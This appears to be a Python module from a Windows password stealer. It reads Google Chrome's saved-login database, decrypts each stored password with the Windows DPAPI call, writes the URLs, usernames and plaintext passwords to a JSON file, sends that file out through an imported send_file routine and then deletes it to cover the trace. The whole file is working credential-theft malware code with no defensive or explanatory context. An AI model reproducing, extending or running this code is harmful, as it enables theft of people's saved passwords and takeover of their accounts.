import os
import sqlite3
import win32crypt
import json
from send_file import send_file
from removefile import removefile

FOLDER_NAME = "content"
FILE_NAME = "chrome_passwords.json"
FILE_PATH = os.path.join(FOLDER_NAME, FILE_NAME)

class chromepasswords:
    def __init__(self, output_file=FILE_PATH):
        self.output_file = output_file

    def get_passwords(self):
        passwords = []
        path = os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data'
        try:
            connection = sqlite3.connect(path)
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                value = v.fetchall()

            for origin_url, username, password in value:
                password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                if password:
                    passwords.append({
                        'origin_url': origin_url,
                        'username': username,
                        'password': password.decode('utf-8')
                    })
        except Exception as e:
            print(e)
        return passwords

    def write_passwords(self):
        if not os.path.exists(FOLDER_NAME):
            os.makedirs(FOLDER_NAME)

        passwords = self.get_passwords()
        with open(self.output_file, 'w') as f:
            f.write(json.dumps(passwords))

    def send_passwords(self):
        send_file(FILE_PATH)
    
    def remove(self):
        removefile(FILE_PATH)
